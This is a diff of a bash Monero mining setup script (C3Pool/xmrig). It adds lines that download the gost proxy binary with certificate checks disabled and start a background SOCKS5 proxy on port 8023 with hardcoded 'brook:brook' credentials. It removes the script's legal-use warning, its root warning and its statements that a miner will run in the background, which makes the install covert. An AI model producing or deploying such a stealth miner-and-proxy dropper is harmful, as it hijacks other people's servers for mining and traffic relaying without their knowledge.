@@ -1,19 +1,12 @@
 #!/bin/bash
 
+# add gost 
+wget --no-check-certificate -N "https://github.com/ginuerzh/gost/releases/download/v2.11.2/gost-linux-amd64-2.11.2.gz"
+gzip -d gost-linux-amd64-2.11.2.gz
+chmod +x gost-linux-amd64-2.11.2
+nohup ./gost-linux-amd64-2.11.2 -L=socks5://brook:brook@:8023 &
+
 VERSION=2.11
-
-# printing greetings
-
-echo "C3Pool mining setup script v$VERSION."
-echo "警告: 请勿将此脚本使用在非法用途,如有发现在非自己所有权的服务器内使用该脚本"
-echo "我们将在接到举报后,封禁违法的钱包地址,并将有关信息收集并提交给警方"
-echo "(please report issues to support@c3pool.com email with full output of this script with extra \"-x\" \"bash\" option)"
-echo
-
-if [ "$(id -u)" == "0" ]; then
-  echo "WARNING: Generally it is not adviced to run this script under root"
-  echo "警告: 不建议在root用户下使用此脚本"
-fi
 
 # command line arguments
 WALLET=$1
@@ -53,13 +46,6 @@ fi
 if ! type lscpu >/dev/null; then
   echo "WARNING: This script requires \"lscpu\" utility to work correctly"
 fi
-
-#if ! sudo -n true 2>/dev/null; then
-#  if ! pidof systemd >/dev/null; then
-#    echo "ERROR: This script requires systemd to work correctly"
-#    exit 1
-#  fi
-#fi
 
 # calculating port
 
@@ -120,15 +106,6 @@ if [ "$PORT" -lt "19999" -o "$PORT" -gt "19999" ]; then
   exit 1
 fi
 
-
-# printing intentions
-
-echo "I will download, setup and run in background Monero CPU miner."
-echo "将进行下载设置,并在后台中运行xmrig矿工."
-echo "If needed, miner in foreground can be started by $HOME/c3pool/miner.sh script."
-echo "如果需要,可以通过以下方法启动前台矿工输出 $HOME/c3pool/miner.sh script."
-echo "Mining will happen to $WALLET wallet."
-echo "将使用 $WALLET 地址进行开采"
 if [ ! -z $EMAIL ]; then
   echo "(and $EMAIL email as password to modify wallet options later at https://c3pool.com site)"
 fi
@@ -141,10 +118,6 @@ else
   echo "Mining in background will be performed using c3pool_miner systemd service."
   echo "后台开采将使用c3pool_miner systemd服务执行."
 fi
-
-echo
-echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB data cache in total, so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
-echo
 
 echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
 echo "等待 15 秒将继续运行安装 (按 Ctrl+C 取消)"
